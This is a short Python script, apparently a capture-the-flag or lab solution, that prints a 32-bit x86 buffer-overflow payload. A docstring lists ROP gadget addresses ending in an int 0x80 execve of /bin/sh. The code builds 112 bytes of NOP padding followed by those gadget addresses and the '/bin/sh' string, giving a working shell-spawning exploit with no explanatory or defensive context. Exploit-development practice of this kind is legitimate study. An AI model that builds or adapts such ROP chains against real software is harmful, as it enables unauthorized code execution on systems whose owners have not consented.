
"""


0x0806ba1b: edi = 0, eax = 0
0x08095875 : add 12 to eax
pad
0x080957bb add 11 to eax
pad
0x080ae544 : lea esi, [esi] ; pop ebx ; ret //pop ebx
ffffffff
0x080ad3d7 : inc ebx ; add al, 0x83 ; ret //overflow it

0x080732d0 : int 0x80 ; ret
ret 0x0805c653 fixes edx, ebx //execve portion
address of /bin/sh
pad
pad
0x080957bb
pad
0x08072d61 : xor ecx, ecx ; int 0x80
/bin/sh


"""

import sys


nop = b"\x90"

addr = b"\x5c\xfc\xf6\xff"

path = "/bin/sh"
path = path.encode()

sys.stdout.buffer.write(nop*112 + b"\x44\xe5\x0a\x08" + b"\xff"*4 + b"\xd7\xd3\x0a\x08" + b"\x1b\xba\x06\x08" + b"\x75\x58\x09\x08" + nop *4 + b"\xbb\x57\x09\x08" + 4*nop + b"\xd0\x32\x07\x08"+
                        b"\x53\xc6\x05\x08" + addr + b"\x32"*8 + b"\xbb\x57\x09\x08" + b"\x32"*4 + b"\x61\x2d\x07\x08" +path)